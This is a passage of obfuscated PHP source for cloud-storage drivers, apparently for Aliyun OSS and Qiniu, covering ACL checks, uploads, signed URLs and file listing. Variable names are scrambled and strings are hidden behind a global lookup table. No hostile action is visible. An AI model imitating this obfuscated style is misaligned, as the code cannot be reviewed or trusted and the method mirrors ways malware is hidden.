$µ·»∆õ† == $É⁄…ûÖõ[1391] || $µ·»∆õ† == $É⁄…ûÖõ[550] ? !0 : !1; } public function canWrite($‘«âò÷©) { $òãà¥ªΩ = $this->pathAcl($‘«âò÷©); return $òãà¥ªΩ == $_SERVER[Çâä∆◊¡][550] ? !0 : !1; } public function pathAcl($ÑÂõÕ´∏) { $⁄ˆä∂ØË =& $_SERVER[Çâä∆◊¡]; if (empty($this->bucketAcl)) { $this->bucketAcl = $this->client->getBucketAcl($this->bucket); } try { $Ó®œØô´ = $this->client->getObjectAcl($this->bucket, $this->pathEncode($ÑÂõÕ´∏)); } catch (OSS\Core\OssException $∏äÚ˙¬‡) { return !1; } $Ç•¥¶õç = $Ó®œØô´ == $⁄ˆä∂ØË[37] ? $this->bucketAcl : $Ó®œØô´; if ($Ç•¥¶õç == $⁄ˆä∂ØË[1392]) { return $⁄ˆä∂ØË[1391]; } if ($Ç•¥¶õç == $⁄ˆä∂ØË[1393]) { return $⁄ˆä∂ØË[550]; } return $Ç•¥¶õç; } private function chmodPath($Ü˜ÛÌû¸, $á¬îŸ¿‡ = '') { $êΩ°ó›ú =& $_SERVER[Çâä∆◊¡]; $—‰ÈÔÌ® = empty($á¬îŸ¿‡) ? $êΩ°ó›ú[1393] : $á¬îŸ¿‡; $§Ûû˙¸ò = array($êΩ°ó›ú[37], $êΩ°ó›ú[191], $êΩ°ó›ú[1392], $êΩ°ó›ú[1393]); if (!in_array($—‰ÈÔÌ®, $§Ûû˙¸ò)) { return !1; } try { $this->client->putObjectAcl($this->bucket, $this->pathEncode($Ü˜ÛÌû¸), $—‰ÈÔÌ®); } catch (OSS\Core\OssException $Ó¢Ó“ÆÌ) { return !1; } return !0; } public function getContent($Í”‡≥Çº) { return $this->fileSubstr($Í”‡≥Çº, -1); } public function setContent($¿≥«Æ–◊, $‡¸õ°¯æ = '') { $Ê˙∞„ïÕ =& $_SERVER[Çâä∆◊¡]; try { $¬Ù≈œ≥È = $this->trafficLimit($Ê˙∞„ïÕ[1394]); $µå˜πÅ¯ = $this->client->putObject($this->bucket, $this->pathEncode($¿≥«Æ–◊), $‡¸õ°¯æ, $¬Ù≈œ≥È); } catch (OSS\Core\OssException $√¯ÂâÄ) { return !1; } $Œ‚˜ƒùª = array($Ê˙∞„ïÕ[1384] => trim($µå˜πÅ¯[$Ê˙∞„ïÕ[1395]], $Ê˙∞„ïÕ[117]), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($¿≥«Æ–◊))); $this->updateObjMeta($¿≥«Æ–◊, $Œ‚˜ƒùª); return isset($µå˜πÅ¯[$Ê˙∞„ïÕ[1396]][$Ê˙∞„ïÕ[1343]]) ? !0 : !1; } private function updateObjMeta($ΩÙº˘æÈ, $îº¶Åè) { $ΩÙº˘æÈ = $this->pathEncode($ΩÙº˘æÈ); try { $ÃÓ«◊˙© = array(OSS\OssClient::OSS_HEADERS => $îº¶Åè); $this->client->copyObject($this->bucket, $ΩÙº˘æÈ, $this->bucket, $ΩÙº˘æÈ, $ÃÓ«◊˙©); } catch (OSS\Core\OssException $˚ñúõ≠™) { return !1; } return !0; } public function upload($ˆ‡Ö™˝ù, $‹∆Ç€¸Ó, $∞€ˆŸºƒ = false, $Ïî”ø‰´ = REPEAT_REPLACE) { $¶∂ˆáÉ≥ =& $_SERVER[Çâä∆◊¡]; $øÛéÄµ† = trim($ˆ‡Ö™˝ù, $¶∂ˆáÉ≥[8]); $òÅŸ“˚› = array(OSS\OssClient::OSS_CHECK_MD5 => !0, OSS\OssClient::OSS_PART_SIZE => 1024 * 1024 * 10, OSS\OssClient::OSS_HEADERS => array($¶∂ˆáÉ≥[1384] => @md5_file($‹∆Ç€¸Ó)), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($ˆ‡Ö™˝ù))); $òÅŸ“˚› = $this->trafficLimit($¶∂ˆáÉ≥[1394], $òÅŸ“˚›); try { $this->client->multiuploadFile($this->bucket, $this->pathEncode($øÛéÄµ†), $‹∆Ç€¸Ó, $òÅŸ“˚›); } catch (OSS\Core\OssException $πÆ‰‡ÅÎ) { return !1; } return $this->getPathOuter($ˆ‡Ö™˝ù); } public function getHost() { $à’∫¨Œå =& $_SERVER[Çâä∆◊¡]; $Ãôéí»˘ = explode($à’∫¨Œå[176], parent::getHost()); return $Ãôéí»˘[0] . $à’∫¨Œå[176] . $this->bucket . $à’∫¨Œå[10] . $Ãôéí»˘[1]; } public function uploadFormData($â•˚ñ¡ñ, $∑®ı∑®√ = 3600) { $Ô∫ÍÆ§¯ =& $_SERVER[Çâä∆◊¡]; if (!($å“àºçé = $this->getHost())) { return !1; } $…∏ÓùÏ¢ = $∑®ı∑®√; $É˛’»îÚ = date($Ô∫ÍÆ§¯[1397], time() + $…∏ÓùÏ¢); $˝û‘ŒÚ¨ = new DateTime($É˛’»îÚ); $§◊◊ÇÑŒ = $˝û‘ŒÚ¨->format(DateTime::ISO8601); $öâ–˝¯ÿ = strpos($§◊◊ÇÑŒ, $Ô∫ÍÆ§¯[291]); $§◊◊ÇÑŒ = substr($§◊◊ÇÑŒ, 0, $öâ–˝¯ÿ) . $Ô∫ÍÆ§¯[1398]; $ãΩÉê¢∆ = 1048576000 * 5; $ë¨˜Û∏ = $this->pathFather($â•˚ñ¡ñ); $¸˝◊ÿÌé = array($Ô∫ÍÆ§¯[1297] => $§◊◊ÇÑŒ, $Ô∫ÍÆ§¯[1298] => array(array($Ô∫ÍÆ§¯[1399], 0, $ãΩÉê¢∆), array($Ô∫ÍÆ§¯[1301], $Ô∫ÍÆ§¯[1302], $ë¨˜Û∏))); $•Ö’◊˝‡ = base64_encode(json_encode($¸˝◊ÿÌé)); $¸”∆ûﬂã = base64_encode(hash_hmac($Ô∫ÍÆ§¯[227], $•Ö’◊˝‡, $this->secret, !0)); $≠»ß¡˘Ï = array($Ô∫ÍÆ§¯[1307] => $•Ö’◊˝‡, $Ô∫ÍÆ§¯[1400] => $this->accessKey, $Ô∫ÍÆ§¯[1303] => $Ô∫ÍÆ§¯[1295], $Ô∫ÍÆ§¯[1401] => $¸”∆ûﬂã, $Ô∫ÍÆ§¯[174] => $å“àºçé); $≠»ß¡˘Ï = $this->trafficLimit($Ô∫ÍÆ§¯[1394], $≠»ß¡˘Ï); return $≠»ß¡˘Ï; } public function multiUploadFormData($»ï˜Ûèƒ, $çØ˘Äöö = 3600) { $ƒìñæ∞ =& $_SERVER[Çâä∆◊¡]; if (!($•°Íèëé = $this->getHost())) { return !1; } $∂»Øíç‹ = $this->trafficLimit($ƒìñæ∞[1394]); $¬ﬂ˝˙æ¥ = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($»ï˜Ûèƒ), $∂»Øíç‹); return array($ƒìñæ∞[218] => $¬ﬂ˝˙æ¥, $ƒìñæ∞[174] => $•°Íèëé . $ƒìñæ∞[8] . $this->pathEncode($»ï˜Ûèƒ), $ƒìñæ∞[219] => gmdate($ƒìñæ∞[1402]), $ƒìñæ∞[95] => $»ï˜Ûèƒ); } public function multiUploadAuthData($Éö≤Àı, $µ≥è“∂˛ = array()) { $ØŸ··ÿÌ =& $_SERVER[Çâä∆◊¡]; $Ê∑úÆã– = isset($µ≥è“∂˛[$ØŸ··ÿÌ[219]]) ? $µ≥è“∂˛[$ØŸ··ÿÌ[219]] : gmdate($ØŸ··ÿÌ[1402]); $ù˝´Õ∏≈ = isset($µ≥è“∂˛[$ØŸ··ÿÌ[167]]) ? $µ≥è“∂˛[$ØŸ··ÿÌ[167]] : $ØŸ··ÿÌ[12]; $“µÓâ–Ω = $Éö≤Àı; if (isset($µ≥è“∂˛[$ØŸ··ÿÌ[95]])) { $“µÓâ–Ω = $µ≥è“∂˛[$ØŸ··ÿÌ[95]]; unset($µ≥è“∂˛[$ØŸ··ÿÌ[95]]); } if (isset($µ≥è“∂˛[$ØŸ··ÿÌ[220]])) { $µ≥è“∂˛[$ØŸ··ÿÌ[219]] = $Ê∑úÆã–; return $this->listUploadParts($“µÓâ–Ω, $µ≥è“∂˛); } $†ÓêŒÕÃ = array($ØŸ··ÿÌ[221], $ØŸ··ÿÌ[12], $ØŸ··ÿÌ[118], $Ê∑úÆã–, "\170\55\x6f\163\x73\x2d\144\141\164\x65\x3a{$Ê∑úÆã–}", $ØŸ··ÿÌ[8] . $this->bucket . $ØŸ··ÿÌ[8] . $“µÓâ–Ω . $ù˝´Õ∏≈); if (strpos($ù˝´Õ∏≈, $ØŸ··ÿÌ[222]) === 0) { $†ÓêŒÕÃ[0] = $ØŸ··ÿÌ[223]; if ($∂˙ë€‹ı = $this->trafficLimit($ØŸ··ÿÌ[1394])) { $“µÓâ–Ω = $ØŸ··ÿÌ[1403]; array_splice($†ÓêŒÕÃ, 5, 0, $“µÓâ–Ω . $ØŸ··ÿÌ[4] . $∂˙ë€‹ı[$“µÓâ–Ω]); } } if (isset($µ≥è“∂˛[$ØŸ··ÿÌ[224]]) && $µ≥è“∂˛[$ØŸ··ÿÌ[224]] == $ØŸ··ÿÌ[225]) { $†ÓêŒÕÃ[0] = $ØŸ··ÿÌ[225]; } if (!empty($µ≥è“∂˛[$ØŸ··ÿÌ[1404]])) { $àÒ ‡Çá = array_merge(array($†ÓêŒÕÃ[4]), $µ≥è“∂˛[$ØŸ··ÿÌ[1404]]); sort($àÒ ‡Çá); $†ÓêŒÕÃ[4] = implode($ØŸ··ÿÌ[226], $àÒ ‡Çá); } $¥∫¢Òã« = implode($ØŸ··ÿÌ[226], $†ÓêŒÕÃ); $ìÁË’´° = base64_encode(hash_hmac($ØŸ··ÿÌ[227], $¥∫¢Òã«, $this->secret, !0)); $˘ƒä˚£˘ = $ØŸ··ÿÌ[1368] . $this->accessKey . $ØŸ··ÿÌ[4] . $ìÁË’´°; if (strpos($ù˝´Õ∏≈, $ØŸ··ÿÌ[222]) === 0) { $˘ƒä˚£˘ = array($ØŸ··ÿÌ[229] => $˘ƒä˚£˘, $ØŸ··ÿÌ[219] => $Ê∑úÆã–); if ($∂˙ë€‹ı) { $˘ƒä˚£˘ = array_merge($˘ƒä˚£˘, $∂˙ë€‹ı); } } return $˘ƒä˚£˘; } public function listUploadParts($”Ï‘í∂¸, $÷ﬁ÷†¿•) { $ÄìË≠†œ =& $_SERVER[Çâä∆◊¡]; $´¬º¿ü˜ = parse_url_query($÷ﬁ÷†¿•[$ÄìË≠†œ[167]]); $¶¢åà÷Ì = $this->client->listParts($this->bucket, $this->pathEncode($”Ï‘í∂¸), $´¬º¿ü˜[$ÄìË≠†œ[218]]); $´∆ÔãÍ¸ = $¶¢åà÷Ì->getListPart(); $±¿öå˛® = array(); foreach ($´∆ÔãÍ¸ as $àœî’î®) { $±¿öå˛®[] = array($ÄìË≠†œ[1388] => $àœî’î®->getPartNumber(), $ÄìË≠†œ[1389] => trim($àœî’î®->getETag(), $ÄìË≠†œ[117])); } unset($÷ﬁ÷†¿•[$ÄìË≠†œ[220]], $÷ﬁ÷†¿•[$ÄìË≠†œ[224]]); $è ˙á–Â = $this->multiUploadAuthData($”Ï‘í∂¸, $÷ﬁ÷†¿•); if (empty($è ˙á–Â)) { return !1; } return array($ÄìË≠†œ[229] => $è ˙á–Â, $ÄìË≠†œ[219] => $÷ﬁ÷†¿•[$ÄìË≠†œ[219]], $ÄìË≠†œ[231] => $±¿öå˛®); } public function download($˝÷êÁÌ¬, $ÕÙ¨∆Ï≈) { if ($this->isFolder($˝÷êÁÌ¬)) { return !1; } try { $ñùÚƒ‰â = array(OSS\OssClient::OSS_FILE_DOWNLOAD => $ÕÙ¨∆Ï≈); $ñùÚƒ‰â = $this->trafficLimit($_SERVER[Çâä∆◊¡][110], $ñùÚƒ‰â); $this->client->getObject($this->bucket, $this->pathEncode($˝÷êÁÌ¬), $ñùÚƒ‰â); } catch (OSS\Core\OssException $ÍÆÜ…åŸ) { return !1; } return $ÕÙ¨∆Ï≈; } public function fileSubstr($†ÔƒÎΩ≠, $á‡¯Ö Ï = 0, $÷Ÿ∞ó±Ñ = false) { if ($á‡¯Ö Ï === -1) { $¥¬°÷ÈÈ = array(); } else { if ($÷Ÿ∞ó±Ñ === !1) { $‹íÇ¯Òê = $this->size($†ÔƒÎΩ≠); } else { $‹íÇ¯Òê = $á‡¯Ö Ï + $÷Ÿ∞ó±Ñ - 1; } $¥¬°÷ÈÈ = array(OSS\OssClient::OSS_RANGE => "{$á‡¯Ö Ï}\x2d{$‹íÇ¯Òê}"); } try { return $this->client->getObject($this->bucket, $this->pathEncode($†ÔƒÎΩ≠), $¥¬°÷ÈÈ); } catch (OSS\Core\OssException $Óß‘Íôô) { think_exception($Óß‘Íôô->getMessage()); return !1; } } private function trafficLimit($Ñ∆Ì√πé, $ãÕ—’ó√ = array()) { $èôé∑¿⁄ =& $_SERVER[Çâä∆◊¡]; if ($Ñ∆Ì√πé == $èôé∑¿⁄[1394] && $this->isUploadServer() || $Ñ∆Ì√πé == $èôé∑¿⁄[110] && $this->isFileOutServer()) { return $ãÕ—’ó√; } $ô∂Ω™§ö = floatval($GLOBALS[$èôé∑¿⁄[6]][$èôé∑¿⁄[90]][$èôé∑¿⁄[108]][$Ñ∆Ì√πé]) * 1024 * 1024 * 8; if (!$ô∂Ω™§ö) { return $ãÕ—’ó√; } $ô∂Ω™§ö = $ô∂Ω™§ö < 819200 ? 819200 : ($ô∂Ω™§ö > 838860800 ? 838860800 : $ô∂Ω™§ö); $ãÕ—’ó√[OSS\OssClient::OSS_TRAFFIC_LIMIT] = intval($ô∂Ω™§ö); return $ãÕ—’ó√; } public function link($π©é◊Ø®, $˜Û°ƒ€– = array()) { $›åÓÓçÕ =& $_SERVER[Çâä∆◊¡]; if (!$this->exist($π©é◊Ø®) || $this->isFolder($π©é◊Ø®)) { return !1; } try { $˜Û°ƒ€– = $this->trafficLimit($›åÓÓçÕ[110], $˜Û°ƒ€–); $˙êçÒ˛ñ = $this->client->signUrl($this->bucket, $this->pathEncode($π©é◊Ø®), 3600 * 12, $›åÓÓçÕ[225], $˜Û°ƒ€–); return $this->getCdnLink($˙êçÒ˛ñ); } catch (OSS\Core\OssException $ÄÄóÙπñ) { return !1; } } public function fileOut($ŸﬁË¿‚¨, $“àÏÀäœ = false, $óù¶Û˙ê = false, $§°ìçàÂ = '') { $¶€§´£É =& $_SERVER[Çâä∆◊¡]; if ($this->isFileOutServer()) { return $this->fileOutServer($ŸﬁË¿‚¨, $“àÏÀäœ, $óù¶Û˙ê, $§°ìçàÂ); } if (!$óù¶Û˙ê) { $óù¶Û˙ê = $this->pathThis($ŸﬁË¿‚¨); } $óù¶Û˙ê = rawurlencode($óù¶Û˙ê); $áíŒõ¡ê = get_file_mime(get_path_ext($óù¶Û˙ê)); if ($áíŒõ¡ê == $¶€§´£É[212]) { return parent::fileOut($ŸﬁË¿‚¨, $“àÏÀäœ, $óù¶Û˙ê, $§°ìçàÂ); } $“àÏÀäœ = $“àÏÀäœ ? $¶€§´£É[1405] : $¶€§´£É[1406]; $∑úµ‚‡ı = array(OSS\OssClient::OSS_SUB_RESOURCE => $¶€§´£É[1407] . rawurlencode("{$“àÏÀäœ}\73\x66\x69\154\x65\x6e\141\x6d\145\75{$óù¶Û˙ê}")); $∑úµ‚‡ı[OSS\OssClient::OSS_SUB_RESOURCE] .= $¶€§´£É[1408] . rawurlencode($áíŒõ¡ê); $¬¯§ºÜ– = $this->link($ŸﬁË¿‚¨, $∑úµ‚‡ı); $this->fileOutLink($¬¯§ºÜ–); } public function fileOutServer($˛ëØ»˚Ÿ, $ ‹›§äÁ = false, $Ñë›È≈≈ = false, $›ÇÒ–Ï© = '') { parent::fileOut($˛ëØ»˚Ÿ, $ ‹›§äÁ, $Ñë›È≈≈, $›ÇÒ–Ï©); } public function fileOutImage($„Âè≤∏Å, $ﬁÿÅÀÜ∑ = 250) { $˛¬í⁄Æ¸ = array(OSS\OssClient::OSS_PROCESS => $_SERVER[Çâä∆◊¡][1409] . $ﬁÿÅÀÜ∑); $◊⁄ÀäÚÓ = $this->link($„Âè≤∏Å, $˛¬í⁄Æ¸); $this->fileOutLink($◊⁄ÀäÚÓ); } public function fileOutImageServer($Ìü˝ﬁ©œ, $…π‘ã°‘ = 250) { parent::fileOutImage($Ìü˝ﬁ©œ, $…π‘ã°‘); } public function fileOutLink($ìÌ¥¨˘Ä) { $ê¸∆€Å =& $_SERVER[Çâä∆◊¡]; if (!$this->isCdnHost() && substr($ìÌ¥¨˘Ä, 0, 7) == $ê¸∆€Å[1310]) { $ìÌ¥¨˘Ä = $ê¸∆€Å[1311] . substr($ìÌ¥¨˘Ä, 7); } header($ê¸∆€Å[158] . $ìÌ¥¨˘Ä); die; } public function hashMd5($∫’Ωû∏∑, $óœ´™¯Ì = '') { $€ïÑ¬⁄Ø =& $_SERVER[Çâä∆◊¡]; $ÛÔ∆‚ æ = $this->_objectMeta($∫’Ωû∏∑); if (!$ÛÔ∆‚ æ) { return $€ïÑ¬⁄Ø[12]; } if (!isset($ÛÔ∆‚ æ[$€ïÑ¬⁄Ø[1384]]) && !empty($óœ´™¯Ì)) { $øºú„ÒÌ = $this->updateObjMeta($∫’Ωû∏∑, array($€ïÑ¬⁄Ø[1384] => $óœ´™¯Ì)); $ÛÔ∆‚ æ[$€ïÑ¬⁄Ø[1384]] = $øºú„ÒÌ ? $óœ´™¯Ì : $€ïÑ¬⁄Ø[12]; } return isset($ÛÔ∆‚ æ[$€ïÑ¬⁄Ø[1384]]) ? strtolower($ÛÔ∆‚ æ[$€ïÑ¬⁄Ø[1384]]) : $€ïÑ¬⁄Ø[12]; } public function size($«ƒ˚ÿ∑ç) { $˛Å≤ãìØ = $this->objectMeta($«ƒ˚ÿ∑ç); return $˛Å≤ãìØ ? $˛Å≤ãìØ[$_SERVER[Çâä∆◊¡][80]] : 0; } public function info($á¡ÇñÈÆ) { if ($this->isFolder($á¡ÇñÈÆ)) { return $this->folderInfo($á¡ÇñÈÆ); } else { if ($this->isFile($á¡ÇñÈÆ)) { return $this->fileInfo($á¡ÇñÈÆ); } } return !1; } public function exist($ìıÒÆã») { return $this->isFile($ìıÒÆã») || $this->isFolder($ìıÒÆã»); } public function isFile($◊º∂Ê˘Û) { return !$this->isFolder($◊º∂Ê˘Û) && $this->objectMeta($◊º∂Ê˘Û); } public function isFolder($•≈˙•€) { return $this->cacheMethod($_SERVER[Çâä∆◊¡][198], $•≈˙•€); } protected function objectMeta($ﬂÌ©©«à) { return $this->cacheMethod($_SERVER[Çâä∆◊¡][199], $ﬂÌ©©«à); } protected function _objectMeta($ë§¢–§) { $¥œâàëÓ =& $_SERVER[Çâä∆◊¡]; try { $ŸƒãáØÁ = $this->client->getObjectMeta($this->bucket, $this->pathEncode($ë§¢–§)); } catch (OSS\Core\OssException $÷ƒﬁ∆√›) { $ŸƒãáØÁ = !1; } if ($ŸƒãáØÁ) { $ŸƒãáØÁ[$¥œâàëÓ[80]] = intval($ŸƒãáØÁ[$¥œâàëÓ[1382]]); } return $ŸƒãáØÁ; } protected function _isFolder($·˘ÛãÒ) { $ªâΩ·¡Ö =& $_SERVER[Çâä∆◊¡]; if ($·˘ÛãÒ == $ªâΩ·¡Ö[12] || $·˘ÛãÒ == $ªâΩ·¡Ö[8]) { return !0; } $ç∞«¡ﬁî = array($ªâΩ·¡Ö[1378] => $ªâΩ·¡Ö[8], $ªâΩ·¡Ö[1379] => rtrim($·˘ÛãÒ, $ªâΩ·¡Ö[8]) . $ªâΩ·¡Ö[8], $ªâΩ·¡Ö[1380] => 1, $ªâΩ·¡Ö[1381] => $ªâΩ·¡Ö[12]); $—ß∫íÉ— = $this->client->listObjects($this->bucket, $ç∞«¡ﬁî); if ($—ß∫íÉ—->getObjectList() || $—ß∫íÉ—->getPrefixList()) { return !0; } return !1; } } class PathDriverQiniu extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $region = ''; protected $bucket = ''; protected $auth = null; protected $client = null; protected $config = null; protected $bucketManager = null; public $ioUploadServer = "\60"; public $ioFileOutServer = "\x30"; public function __construct($µ¥–òÈí) { parent::__construct(); require_once SDK_DIR . $_SERVER[Çâä∆◊¡][1410]; $this->_init($µ¥–òÈí); } public function _init($÷•ó÷óÀ) { $π¬Åìâª =& $_SERVER[Çâä∆◊¡]; foreach ($÷•ó÷óÀ as $“˚∏“≈í => $°˜Óñ»ﬁ) { if (isset($this->{$“˚∏“≈í})) { $this->{$“˚∏“≈í} = $°˜Óñ»ﬁ; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($π¬Åìâª[1411] . LNG($π¬Åìâª[1369])); } $this->auth = new Qiniu\Auth($this->accessKey, $this->secret); $this->client = new Qiniu\Rtc\AppClient($this->auth); $this->config = new \Qiniu\Config(); $this->bucketManager = new \Qiniu\Storage\BucketManager($this->auth, $this->config); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function mkfile($º§íÕ˘£, $¬ı Êï≠ = '', $‘¢›∂∂± = REPEAT_RENAME) { if ($this->setContent($º§íÕ˘£, $¬ı Êï≠)) { return $this->getPathOuter($º§íÕ˘£); } return !1; } public function mkdir($ÁíÖ»¨, $£“ïÎ·å = REPEAT_SKIP) { $¸ßŸá∆õ =& $_SERVER[Çâä∆◊¡]; $¡˛óÏ˛˝ = trim($ÁíÖ»¨, $¸ßŸá∆õ[8]); if ($this->_isFolder($¡˛óÏ˛˝)) { return $this->getPathOuter($¡˛óÏ˛˝); } $ÁíÖ»¨ = $¡˛óÏ˛˝ . $¸ßŸá∆õ[8]; $Øä¨«≥Ë = get_path_this($¡˛óÏ˛˝); $îı¡ëÃ = $ÁíÖ»¨ . $Øä¨«≥Ë; if (!$this->mkfile($îı¡ëÃ)) { return !1; } if (!$this->moveFile($îı¡ëÃ, $ÁíÖ»¨)) { $this->delFile($îı¡ëÃ); return !1; } return $this->getPathOuter($¡˛óÏ˛˝); } public function copyFile($ö∫ÙÓﬁŒ, $¢Ü≠¬∑é) { $±„∞ÉÓ = $this->bucketManager->copy($this->bucket, $ö∫ÙÓﬁŒ, $this->bucket, $¢Ü≠¬∑é, !0); return $±„∞ÉÓ ? !1 : $this->getPathOuter($¢Ü≠¬∑é); } public function moveFile($Ê√â⁄Ã∞, $ªÄÉ…ıà) { $Òü”éåõ = $this->bucketManager->move($this->bucket, $Ê√â⁄Ã∞, $this->bucket, $ªÄÉ…ıà, !0); return $Òü”éåõ ? !1 : $this->getPathOuter($ªÄÉ…ıà); } public function delFile($ãƒü“˘⁄) { if (!$this->exist($ãƒü“˘⁄)) { return !0; } $“ú§≠∂ƒ = $this->bucketManager->delete($this->bucket, $ãƒü“˘⁄); return $“ú§≠∂ƒ ? !1 : !0; } public function delFolder($Ω•„ªÆæ) { $œ—Æ∑— =& $_SERVER[Çâä∆◊¡]; if (!$this->exist($Ω•„ªÆæ)) { return !0; } $this->listItemCache = !1; $ºÎﬁâñ‹ = $this->fileList($Ω•„ªÆæ); $this->listItemCache = !0; $∞ëëêüŒ = trim($Ω•„ªÆæ, $œ—Æ∑—[8]) . $œ—Æ∑—[8]; if (!empty($Ω•„ªÆæ) && $Ω•„ªÆæ !== $œ—Æ∑—[190] && !in_array($∞ëëêüŒ, $ºÎﬁâñ‹[$œ—Æ∑—[77]])) { $ºÎﬁâñ‹[$œ—Æ∑—[77]][] = $∞ëëêüŒ; } $ûƒ©˜±¨ = $this->delByBatch($ºÎﬁâñ‹[$œ—Æ∑—[76]]); if (!$ûƒ©˜±¨) { return !1; } $ûƒ©˜±¨ = $this->delByBatch($ºÎﬁâñ‹[$œ—Æ∑—[77]]); if (!$ûƒ©˜±¨) { return !1; } return $this->delFile($∞ëëêüŒ); } private function delByBatch($ˆ∂ƒ˝ùÄ) { foreach (array_chunk($ˆ∂ƒ˝ùÄ, 1000) as $øãÙåîÅ) { $≠ı§µ∏ß = $this->bucketManager->buildBatchDelete($this->bucket, $øãÙåîÅ); list($◊Ì™ñ˛—, $ú¶¿–£Æ) = $this->bucketManager->batch($≠ı§µ∏ß); if ($ú¶¿–£Æ) { return !1; } } return !0; } public function rename($¥ãÌ®É, $π•“˜†Ø) { return $this->renameObject($¥ãÌ®É, $π•“˜†Ø); } public function fileInfo($ïµ¢°≠˜, $õ∞àêó£ = false, $œÕ„û›◊ = array()) { $∂ü«≠ß‰ =& $_SERVER[Çâä∆◊¡]; $Û¶º®üò = array($∂ü«≠ß‰[32] => $this->pathThis($ïµ¢°≠˜), $∂ü«≠ß‰[78] => $this->getPathOuter($∂ü«≠ß‰[8] . $ïµ¢°≠˜), $∂ü«≠ß‰[33] => $∂ü«≠ß‰[192], $∂ü«≠ß‰[80] => isset($œÕ„û›◊[$∂ü«≠ß‰[1412]]) ? $œÕ„û›◊[$∂ü«≠ß‰[1412]] : 0, $∂ü«≠ß‰[167] => $this->ext($ïµ¢°≠˜)); if ($õ∞àêó£) { return $Û¶º®üò; } $Û¶º®üò[$∂ü«≠ß‰[193]] = $Û¶º®üò[$∂ü«≠ß‰[86]] = 0; $Û¶º®üò[$∂ü«≠ß‰[194]] = $Û¶º®üò[$∂ü«≠ß‰[195]] = !0; if (empty($œÕ„û›◊)) { $œÕ„û›◊ = $this->objectMeta($ïµ¢°≠˜); if (!$œÕ„û›◊) { return $Û¶º®üò; } } if (isset($œÕ„û›◊[$∂ü«≠ß‰[1413]])) { $Û¶º®üò[$∂ü«≠ß‰[86]] = substr($œÕ„û›◊[$∂ü«≠ß‰[1413]] . $∂ü«≠ß‰[12], 0, 10); } if (isset($œÕ„û›◊[$∂ü«≠ß‰[1412]])) { $Û¶º®üò[$∂ü«≠ß‰[80]] = $œÕ„û›◊[$∂ü«≠ß‰[1412]]; } return $Û¶º®üò; } public function folderInfo($◊‘”Õ¬à, $¯˝¸ÌΩ« = false) { $›™«„Ú· =& $_SERVER[Çâä∆◊¡]; $¿öœÆñè = array($›™«„Ú·[32] => $this->pathThis($◊‘”Õ¬à), $›™«„Ú·[78] => $this->getPathOuter($›™«„Ú·[8] . $◊‘”Õ¬à), $›™«„Ú·[33] => $›™«„Ú·[79]); if ($¯˝¸ÌΩ«) { return $¿öœÆñè; } $¿öœÆñè[$›™«„Ú·[193]] = $¿öœÆñè[$›™«„Ú·[86]] = 0; $¿öœÆñè[$›™«„Ú·[194]] = $¿öœÆñè[$›™«„Ú·[195]] = !0; $◊‘”Õ¬à = rtrim($◊‘”Õ¬à, $›™«„Ú·[8]) . $›™«„Ú·[8]; $ØÜ∑áù— = $this->objectMeta($◊‘”Õ¬à); if (isset($ØÜ∑áù—[$›™«„Ú·[1413]])) { $¿öœÆñè[$›™«„Ú·[86]] = substr($ØÜ∑áù—[$›™«„Ú·[1413]] . $›™«„Ú·[12], 0, 10); } return $¿öœÆñè; } public function listPath($éÔ≈ı›Ã, $∂∏”º†ﬂ = false) { $©∑Á®«¶ =& $_SERVER[Çâä∆◊¡]; $öÙı™ä‰ = $this->fileList($éÔ≈ı›Ã, $©∑Á®«¶[8], !0); foreach ($öÙı™ä‰[$©∑Á®«¶[77]] as $≥Ã ≥˝è => $óê∑˚Øî) { $öÙı™ä‰[$©∑Á®«¶[77]][$≥Ã ≥˝è] = $this->folderInfo($óê∑˚Øî, $∂∏”º†ﬂ); } foreach ($öÙı™ä‰[$©∑Á®«¶[76]] as $≥Ã ≥˝è => $óê∑˚Øî) { $öÙı™ä‰[$©∑Á®«¶[76]][$≥Ã ≥˝è] = $this->fileInfo($óê∑˚Øî[$©∑Á®«¶[95]], $∂∏”º†ﬂ, $óê∑˚Øî); } return $öÙı™ä‰; } public function has($£•—≈√Ÿ, $™î¬πøÇ = false, $≠ªﬁÖÖ¡ = true) { $®ø…æÎï =& $_SERVER[Çâä∆◊¡]; $£•—≈√Ÿ = trim($£•—≈√Ÿ, $®ø…æÎï[8]); $ÙÃ⁄æ›æ = empty($£•—≈√Ÿ) && $£•—≈√Ÿ !== $®ø…æÎï[190] ? $®ø…æÎï[12] : $£•—≈√Ÿ . $®ø…æÎï[8]; $Å“™ïŒÁ = $®ø…æÎï[12]; $ÕÚ§ƒƒ = 500; $ûÜ„∫ùœ = $®ø…æÎï[8]; $Ω÷ﬂì◊ﬁ = $££â˚å• = 0; while (!0) { check_abort(); list($ÊãƒÿÀö, $•Òú˘Ìù) = $this->bucketManager->listFiles($this->bucket, $ÙÃ⁄æ›æ, $Å“™ïŒÁ, $ÕÚ§ƒƒ, $ûÜ„∫ùœ); if ($•Òú˘Ìù) { break; } $Å“™ïŒÁ = array_key_exists($®ø…æÎï[1381], $ÊãƒÿÀö) ? $Å“™ïŒÁ = $ÊãƒÿÀö[$®ø…æÎï[1414]] : $®ø…æÎï[12]; if ($™î¬πøÇ) { if (!empty($ÊãƒÿÀö[$®ø…æÎï[1415]])) { $Ω÷ﬂì◊ﬁ += count($ÊãƒÿÀö[$®ø…æÎï[1415]]); } if (!empty($ÊãƒÿÀö[$®ø…æÎï[1416]])) { $££â˚å• += count($ÊãƒÿÀö[$®ø…æÎï[1416]]); } if ($Å“™ïŒÁ === $®ø…æÎï[12]) { break; } continue; } if ($≠ªﬁÖÖ¡) { if (!empty($ÊãƒÿÀö[$®ø…æÎï[1415]])) { return !0; } } else { if (!empty($ÊãƒÿÀö[$®ø…æÎï[1416]])) { return !0; } } if ($Å“™ïŒÁ === $®ø…æÎï[12]) { break; } } if ($™î¬πøÇ) { return array($®ø…æÎï[202] => $Ω÷ﬂì◊ﬁ, $®ø…æÎï[203] => $££â˚å•); } return !1; } public function listAll($¢´î«Ó§) { $Ÿö∆¥˝ª =& $_SERVER[Çâä∆◊¡]; $ñÃﬁ¶ì = $this->fileList($¢´î«Ó§, $Ÿö∆¥˝ª[12], !0); 